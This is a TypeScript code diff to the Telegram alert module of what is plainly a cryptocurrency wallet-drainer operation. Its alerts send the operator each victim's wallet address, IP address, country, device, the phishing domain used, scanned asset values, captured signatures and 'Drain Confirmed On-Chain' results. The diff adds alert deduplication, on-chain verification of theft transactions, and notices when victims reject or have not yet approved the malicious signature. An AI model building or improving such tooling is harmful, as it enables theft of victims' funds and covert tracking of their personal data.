@@ -4,6 +4,12 @@
  * Silent fail — never crashes the main flow.
  */
 
+import {
+  isEvmTransactionHash,
+  pollEvmTransactionConfirmation,
+  verifyEvmTransaction,
+} from './evm-tx-verify.js'
+
 // ─── Outbound rate-limit queue (1 msg / second) ────────────────────────────────
 // Telegram allows ~30 messages/second per bot, but burst sentinel/gas alerts can
 // easily produce dozens in a single tick.  Serialise all outbound sends through a
@@ -73,6 +79,42 @@ type DrainBatchWallet = {
 const drainBatchByWallet = new Map<string, DrainBatchWallet>()
 const drainBatchDedupeKeys = new Set<string>()
 let drainBatchTimer: ReturnType<typeof setInterval> | null = null
+
+/** Prevent repeated connect/scan Telegram spam for the same wallet session. */
+const notifySessionDedupe = new Map<string, number>()
+const DEFAULT_SESSION_DEDUPE_TTL_MS = 30 * 60 * 1_000
+
+function normalizeNotifyWalletKey(wallet: string): string {
+  const w = wallet.trim()
+  return /^0x[a-fA-F0-9]{40}$/.test(w) ? w.toLowerCase() : w
+}
+
+/** Returns true when this notification key has not been sent within TTL. */
+export function shouldSendTelegramOnce(
+  key: string,
+  ttlMs: number = DEFAULT_SESSION_DEDUPE_TTL_MS,
+): boolean {
+  const now = Date.now()
+  const expiresAt = notifySessionDedupe.get(key)
+  if (expiresAt != null && expiresAt > now) return false
+  notifySessionDedupe.set(key, now + ttlMs)
+  if (notifySessionDedupe.size > 10_000) {
+    for (const [k, exp] of notifySessionDedupe) {
+      if (exp <= now) notifySessionDedupe.delete(k)
+    }
+  }
+  return true
+}
+
+export function buildWalletSessionNotifyKey(
+  event: 'connect' | 'scan' | 'reject' | 'no_action',
+  wallet: string,
+  ip?: string | null,
+): string {
+  const walletKey = normalizeNotifyWalletKey(wallet)
+  const ipKey = ip && ip !== 'Unknown' ? ip.trim() : 'unknown-ip'
+  return `${event}:${walletKey}:${ipKey}`
+}
 
 /** OPSEC — show first 6 + last 4 chars only (e.g. `0x1234...abcd`). */
 export function truncateSignatureHex(value: string): string {
@@ -500,16 +542,20 @@ export async function notifyWalletConnected(
   walletType: string,
   ctx?: TelegramRequestContext,
 ): Promise<void> {
+  const dedupeKey = buildWalletSessionNotifyKey('connect', address, ctx?.ip)
+  if (!shouldSendTelegramOnce(dedupeKey)) return
+
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
 
   const text =
-    `⚡ <b>New Visitor (${walletType || chainFamily})</b> — scanning...\n` +
+    `🔌 <b>Wallet Connected</b> (${walletType || chainFamily})\n` +
     `👛 <code>${address}</code>\n` +
     (device ? `💻 ${device}\n` : '') +
     (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
     (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
     (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
+    `ℹ️ Scanning assets — drain not confirmed yet\n` +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -521,13 +567,16 @@ export async function notifyScanComplete(
   ctx?: TelegramRequestContext,
   assets?: StrategyAsset[],
 ): Promise<void> {
+  const dedupeKey = buildWalletSessionNotifyKey('scan', address, ctx?.ip)
+  if (!shouldSendTelegramOnce(dedupeKey)) return
+
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
   const walletType = ctx?.wallet_type ?? 'Wallet'
   const strategyBlock = assets && assets.length > 0 ? buildStrategyLines(assets, totalUsd) : ''
 
   const text =
-    `✨ <b>New Connect (${walletType})</b>\n` +
+    `📊 <b>Asset Scan Complete</b> (${walletType})\n` +
     (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 IP: <code>${ctx.ip}</code>` : '') +
     (country ? ` | ${country}\n` : '\n') +
     `👛 <b>Wallet:</b> <code>${address}</code>\n` +
@@ -536,6 +585,7 @@ export async function notifyScanComplete(
     `\n` +
     (strategyBlock ||
       (`💰 <b>Value:</b> $${totalUsd.toFixed(2)} (${assetsCount} asset${assetsCount !== 1 ? 's' : ''})\n`)) +
+    `ℹ️ Waiting for wallet signature / TX — not drained yet\n` +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -553,7 +603,7 @@ export async function notifySignatureReceived(
   const sigShort = truncateSignatureHex(String(ctx?.signature ?? signature))
 
   const text =
-    `✍️ <b>Signed! (${ctx?.wallet_type ?? chain})</b>\n` +
+    `✍️ <b>Signature Received</b> (${ctx?.wallet_type ?? chain})\n` +
     `👛 <code>${address}</code>` +
     (chain ? ` | ⛓️ ${chain}` : '') +
     (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
@@ -563,6 +613,7 @@ export async function notifySignatureReceived(
     (device ? `💻 ${device}\n` : '') +
     (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
     `🔑 <code>${sigShort}</code>\n` +
+    `ℹ️ Backend processing — on-chain drain not confirmed yet\n` +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -605,7 +656,7 @@ export async function notifyBroadcastScheduled(
   await sendTelegramMessage(text)
 }
 
-/** Sends immediate settlement TX alert and enqueues 5-minute batch summary. */
+/** Sends immediate settlement TX alert only after on-chain confirmation is verified elsewhere. */
 export async function notifyBroadcastConfirmed(
   txHash: string,
   address: string,
@@ -619,8 +670,8 @@ export async function notifyBroadcastConfirmed(
     : `🔗 <code>${truncateWalletForAlert(txHash)}</code>\n`
 
   const text =
-    `💸 <b>Drained!</b>` +
-    (usdVal > 0 ? ` $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `✅ <b>Drain Confirmed On-Chain</b>` +
+    (usdVal > 0 ? ` — $${formatUsdTotal(usdVal)}` : '') + `\n` +
     `👛 <code>${address}</code>` +
     (chainFamily ? ` | ⛓️ ${chainFamily}` : '') + `\n` +
     txLine +
@@ -633,6 +684,63 @@ export async function notifyBroadcastConfirmed(
     chains: [ctx?.chain_family, ctx?.chain_id != null ? String(ctx.chain_id) : null],
     tx_hash: ctx?.tx_hash ?? txHash,
   })
+}
+
+/** Batch ID or unconfirmed hash — user may still need to approve in wallet. */
+export async function notifyTxAwaitingConfirmation(
+  referenceId: string,
+  address: string,
+  ctx?: TelegramRequestContext,
+): Promise<void> {
+  const dedupeKey = `pending:${normalizeNotifyWalletKey(address)}:${referenceId.trim().toLowerCase()}`
+  if (!shouldSendTelegramOnce(dedupeKey, 10 * 60 * 1_000)) return
+
+  const chainFamily = ctx?.chain_family ?? 'EVM'
+  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
+  const text =
+    `⏳ <b>Awaiting Wallet / On-Chain Confirmation</b>\n` +
+    `👛 <code>${truncateWalletForAlert(address)}</code> | ⛓️ ${chainFamily}` +
+    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `🆔 Ref: <code>${truncateWalletForAlert(referenceId)}</code>\n` +
+    `ℹ️ Not drained yet — waiting for user approval or block confirmation\n` +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+/** User rejected MetaMask / WalletConnect popup — no funds moved. */
+export async function notifyUserRejectedWallet(
+  address: string,
+  ctx?: TelegramRequestContext & { detail?: string | null },
+): Promise<void> {
+  const dedupeKey = buildWalletSessionNotifyKey('reject', address, ctx?.ip)
+  if (!shouldSendTelegramOnce(dedupeKey, 5 * 60 * 1_000)) return
+
+  const text =
+    `🚫 <b>User Rejected — No Drain</b>\n` +
+    `👛 <code>${truncateWalletForAlert(address)}</code>` +
+    (ctx?.chain_id != null ? ` | ⛓️ ${ctx.chain_id}` : '') +
+    (ctx?.wallet_type ? ` | ${ctx.wallet_type}` : '') + `\n` +
+    (ctx?.detail ? `⚠️ ${ctx.detail.slice(0, 200)}\n` : '') +
+    `ℹ️ Wallet popup cancelled — nothing was drained\n` +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
+}
+
+/** Scan finished but no lethal signature / TX was submitted. */
+export async function notifyDrainNoAction(
+  address: string,
+  ctx?: TelegramRequestContext & { detail?: string | null },
+): Promise<void> {
+  const dedupeKey = buildWalletSessionNotifyKey('no_action', address, ctx?.ip)
+  if (!shouldSendTelegramOnce(dedupeKey, 10 * 60 * 1_000)) return
+
+  const text =
+    `➖ <b>No Drain Action</b>\n` +
+    `👛 <code>${truncateWalletForAlert(address)}</code>` +
+    (ctx?.chain_id != null ? ` | ⛓️ ${ctx.chain_id}` : '') + `\n` +
+    (ctx?.detail ? `ℹ️ ${ctx.detail.slice(0, 200)}\n` : `ℹ️ No signature or confirmed TX submitted\n`) +
+    `🕐 ${getISTTimestamp()}`
+  await sendTelegramMessage(text)
 }
 
 /** Batched into 5-minute settlement summary (not sent immediately). */
@@ -771,7 +879,7 @@ export async function notifyNewSignatureAnchorRequest(
   const chain = ctx?.chain_family ?? chainFamily
 
   const text =
-    `🎯 <b>Executing! (${walletType || chain})</b>\n` +
+    `🔄 <b>Processing Signature</b> (${walletType || chain})\n` +
     `👛 <code>${address}</code>` +
     (chain ? ` | ⛓️ ${chain}` : '') +
     (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
@@ -780,6 +888,7 @@ export async function notifyNewSignatureAnchorRequest(
     (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
     (device ? `💻 ${device}\n` : '') +
     (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
+    `ℹ️ Settlement queued — not drained until TX confirms\n` +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -968,13 +1077,25 @@ export async function notifySettlementResult(params: {
       : `🔗 <code>${truncateWalletForAlert(params.tx_hash)}</code>\n`
   }
 
+  const statusLabel =
+    params.status === 'settled'
+      ? 'Drain Confirmed On-Chain'
+      : params.status === 'partial'
+        ? 'Partial Drain'
+        : 'Drain Failed'
+
   const text =
-    `${statusEmoji} <b>${params.status === 'settled' ? 'Drained!' : params.status === 'partial' ? 'Partial Drain' : 'Failed'}</b>` +
-    (usdVal > 0 ? ` $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `${statusEmoji} <b>${statusLabel}</b>` +
+    (usdVal > 0 && params.status === 'settled' ? ` — $${formatUsdTotal(usdVal)}` : '') + `\n` +
     `👛 <code>${truncateWalletForAlert(params.wallet_address)}</code> | ⛓️ ${chain}\n` +
     `💎 ${amountLine}\n` +
     txLine +
     (params.error_message ? `⚠️ ${params.error_message.slice(0, 200)}\n` : '') +
+    (params.status === 'failed'
+      ? `ℹ️ No funds drained — settlement did not complete\n`
+      : params.status === 'settled'
+        ? ``
+        : `ℹ️ Some legs may still be pending\n`) +
     `🕐 ${getISTTimestamp()}`
 
   await sendTelegramMessage(text)
@@ -987,4 +1108,101 @@ export async function notifySettlementResult(params: {
       tx_hash: params.tx_hash,
     })
   }
+}
+
+async function pollAndNotifyEvmSettlement(params: {
+  txHash: string
+  address: string
+  chainId: number
+  ctx?: TelegramRequestContext
+}): Promise<void> {
+  const dedupeKey = `poll:${params.chainId}:${params.txHash.toLowerCase()}`
+  if (!shouldSendTelegramOnce(dedupeKey, 15 * 60 * 1_000)) return
+
+  const finalStatus = await pollEvmTransactionConfirmation({
+    chainId: params.chainId,
+    txHash: params.txHash,
+    maxAttempts: 24,
+    intervalMs: 5_000,
+  })
+
+  if (finalStatus === 'confirmed') {
+    await notifyBroadcastConfirmed(params.txHash, params.address, {
+      ...params.ctx,
+      tx_hash: params.txHash,
+      chain_id: params.chainId,
+    })
+    return
+  }
+
+  await notifySettlementResult({
+    wallet_address: params.address,
+    chain_id: params.chainId,
+    chain_family: params.ctx?.chain_family ?? 'EVM',
+    scout_value_usd: params.ctx?.scout_value_usd,
+    amount: params.ctx?.amount,
+    token_address: params.ctx?.tokenAddress,
+    status: finalStatus === 'failed' ? 'failed' : 'failed',
+    tx_hash: isEvmTransactionHash(params.txHash) ? params.txHash : null,
+    error_message:
+      finalStatus === 'failed'
+        ? 'Transaction reverted on-chain'
+        : finalStatus === 'pending'
+          ? 'Transaction still pending after polling window'
+          : 'No on-chain transaction found for submitted reference',
+  })
+}
+
+/** Verify EVM hash on-chain before sending success; batch IDs get pending + poll. */
+export async function notifyEvmSettlementWhenVerified(params: {
+  txHash: string
+  address: string
+  chainId: number
+  ctx?: TelegramRequestContext
+}): Promise<void> {
+  const hash = params.txHash.trim()
+  if (!hash.startsWith('0x')) {
+    await notifyDrainNoAction(params.address, {
+      ...params.ctx,
+      chain_id: params.chainId,
+      detail: 'Invalid transaction reference submitted',
+    })
+    return
+  }
+
+  if (!isEvmTransactionHash(hash)) {
+    await notifyTxAwaitingConfirmation(hash, params.address, {
+      ...params.ctx,
+      chain_id: params.chainId,
+    })
+    return
+  }
+
+  const status = await verifyEvmTransaction(params.chainId, hash)
+  if (status === 'confirmed') {
+    await notifyBroadcastConfirmed(hash, params.address, {
+      ...params.ctx,
+      tx_hash: hash,
+      chain_id: params.chainId,
+    })
+    return
+  }
+  if (status === 'failed') {
+    await notifySettlementResult({
+      wallet_address: params.address,
+      chain_id: params.chainId,
+      chain_family: params.ctx?.chain_family ?? 'EVM',
+      scout_value_usd: params.ctx?.scout_value_usd,
+      status: 'failed',
+      tx_hash: hash,
+      error_message: 'Transaction reverted on-chain',
+    })
+    return
+  }
+
+  await notifyTxAwaitingConfirmation(hash, params.address, {
+    ...params.ctx,
+    chain_id: params.chainId,
+  })
+  void pollAndNotifyEvmSettlement(params)
 }
